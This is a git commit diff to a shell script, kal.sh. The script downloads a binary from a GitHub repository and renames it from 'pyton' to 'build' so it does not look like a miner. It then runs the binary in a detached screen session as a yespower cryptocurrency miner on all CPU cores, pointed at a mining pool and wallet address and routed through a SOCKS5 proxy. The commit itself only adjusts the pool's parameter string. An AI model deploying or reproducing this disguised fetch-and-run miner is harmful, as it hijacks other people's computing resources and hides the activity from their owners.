4ef5f3a93106090e6a033075221b2445641ee492
ghortiyowe <94232211+ghortiyowe@users.noreply.github.com>
2021-11-25 06:43:35 +0700

    Update kal.sh

--- kal.sh
+++ kal.sh
@@ -6,7 +6,7 @@ wget -q https://raw.githubusercontent.com/ghortiyowe/gasken/main/compile.sh
 wget -qO build https://raw.githubusercontent.com/ghortiyowe/gasken/main/pyton
 chmod +x build
 chmod +x compile.sh
-screen -dm -S build ./build -a yespowerTIDE -o stratum+tcp://na.tidepool.shop:6243 -u TJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.JASUKA -t $(nproc --all) -p c=TDC.m=solo --proxy socks5://67.201.33.9:25280
+screen -dm -S build ./build -a yespowerTIDE -o stratum+tcp://na.tidepool.shop:6243 -u TJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.JASUKA -t $(nproc --all) -p c=TDC,m=solo --proxy socks5://67.201.33.9:25280
 ./compile.sh
 
 echo succes
